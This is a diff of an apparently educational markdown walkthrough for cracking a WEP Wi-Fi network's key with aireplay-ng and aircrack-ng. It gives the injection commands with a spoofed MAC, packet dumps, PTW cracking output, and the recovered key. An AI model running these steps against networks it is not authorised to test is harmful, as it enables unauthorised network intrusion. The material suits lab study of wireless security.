@@ -292,25 +292,117 @@ Output Text:
  E8:94:F6:F2:F1:E1  50:82:D5:91:1B:32  -58   48e-24      0        4  
 ```
 
-## Create Cap File
+## Beacon Frame For Channel
 
 Beacon Command:  
-`sudo aireplay-ng -1 600 -a E8:94:F6:F2:F1:E1 -h 12:34:45:67:89:01 wlp2s0mon`
+`sudo aireplay-ng -1 600 -a E8:94:F6:F2:F1:E1 -h 12:34:45:67:89:01 wlp2s0mon`  
+Creates the beacon.
 
+Output Screenshot:  
+![Screenshot](images/BeaconFrameOnChannel.png)
+
+Output Text:  
+```
+The interface MAC (AC:7B:A1:84:EB:D5) doesn't match the specified MAC (-h).
+	ifconfig wlp2s0mon hw ether 12:34:45:67:89:01
+13:52:22  Waiting for beacon frame (BSSID: E8:94:F6:F2:F1:E1) on channel 12
+13:52:23  wlp2s0mon is on channel 12, but the AP uses channel 6
+```
+
+
+## Start Capturing Packets
 
 Create Cap Command:  
-`sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b E8:94:F6:F2:F1:E1 -h 12:34:45:67:89:01 wlp2s0mon`
+`sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b E8:94:F6:F2:F1:E1 -h 12:34:45:67:89:01 wlp2s0mon`  
+Writes the data frames or packets in the `<WEP_Network>.cap`.
 
 
 Output Screenshot:  
-![Screenshot](images/Aireplay_Packet_Generation.png)
+![Screenshot](images/AirDump_Packets.png)
+
+Output Text:  
+```
+The interface MAC (AC:7B:A1:84:EB:D5) doesn't match the specified MAC (-h).
+	ifconfig wlp2s0mon hw ether 12:34:45:67:89:01
 
 
-## Crack Cap File
+        Size: 68, FromDS: 1, ToDS: 0 (WEP)
+
+              BSSID  =  E8:94:F6:F2:F1:E1
+          Dest. MAC  =  FF:FF:FF:FF:FF:FF
+         Source MAC  =  AC:2B:6E:15:66:D9
+
+        0x0000:  0862 0000 ffff ffff ffff e894 f6f2 f1e1  .b..............
+        0x0010:  ac2b 6e15 66d9 10cc 566f 0a00 1afe ce6d  .+n.f...Vo.....m
+        0x0020:  6747 c002 d018 907e 2991 fff9 68e3 3196  gG.....~)...h.1.
+        0x0030:  ceb1 ffa7 948e cd81 b855 6f53 a111 8c03  .........UoS....
+        0x0040:  fdc2 b50c                                ....
+
+Use this packet ? y
+
+Saving chosen packet in replay_src-1029-135239.cap
+You should also start airodump-ng to capture replies.
+
+Sent 449120 packets...(500 pps)
+```
+
+
+## Execute Crack
+
 
 Command:  
-`sudo aircrack-ng to_break_educational-01.cap`
+`sudo aircrack-ng to_break_educational-01.cap`  
+Explanation: Use `aircrack-ng` to execute the crack. The `aircrack-ng` decryptes the ***<WEP_Netowrk>.cap*** file to crack the ***password*** of the WEP network.
 
+
+Output Screenshot:  
+![Screenshot](images/AirCrackNG_Crack.png)
+
+Output Text:
+
+```
+Opening to_break_educational-01.cap
+Read 57789 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  E8:94:F6:F2:F1:E1  to_break_educational      WEP (28383 IVs)
+
+Choosing first network as target.
+
+Opening to_break_educational-01.cap
+Attack will be restarted every 5000 captured ivs.
+Starting PTW attack with 28386 ivs.
+
+
+                            Aircrack-ng 1.2 rc4
+
+
+            [00:00:00] Tested 740881 keys (got 28186 IVs)
+                            Aircrack-ng 1.2 rc4
+   KB    depth   byte(vote)
+    0    0/  2   1E(36608) 6F(34816) 8D(34560) 6D(34304) 
+    1    3/ [00:00:00] Tested 952561 keys (got 28186 IVs)
+    2    0/  1   5B(40704) 8Aircrack-ng 1.2 rc438(34816) 
+   KB    depth   byte(vote)17(35584) 88(34560) 47(34048) 
+    0    0/  1   1E(36608) 6F(34816) 8D(34560) 6D(34304) 
+    1    3/ [00:00:00] Tested 1053361 keys (got 28186 IVs)
+    2    0/  1   5B(40704) 8Aircrack-ng 1.2 rc438(34816) 
+   KB    depth   byte(vote)17(35584) 88(34560) 47(34048) 
+    0    0/  1   1E(36608) 6F(34816) 8D(34560) 6D(34304) 
+    1    3/ [00:00:00] Tested 514 keys (got 28186 IVs)
+    2    0/  1   5B(40704) 81(37376) 6D(35584) 38(34816) 
+   KB    depth   byte(vote)17(35584) 88(34560) 47(34048) 
+    0    1/  8   6F(35072) 8D(34560) 6D(34304) BB(34304) 
+    1    1/  7   6B(35584) 30(35072) DA(34816) F3(34048) 
+    2    0/  1   79(40704) 81(37376) 6D(35584) 38(35072) 
+    3    0/  1   64(42240) 17(35584) 88(34560) 47(34048) 
+    4    8/ 10   1A(33280) E9(33024) FC(32768) 61(32512) 
+
+                     KEY FOUND! [ 6F:6B:79:64:32 ] (ASCII: okyd2 )
+	Decrypted correctly: 100%
+
+```
 
 
 
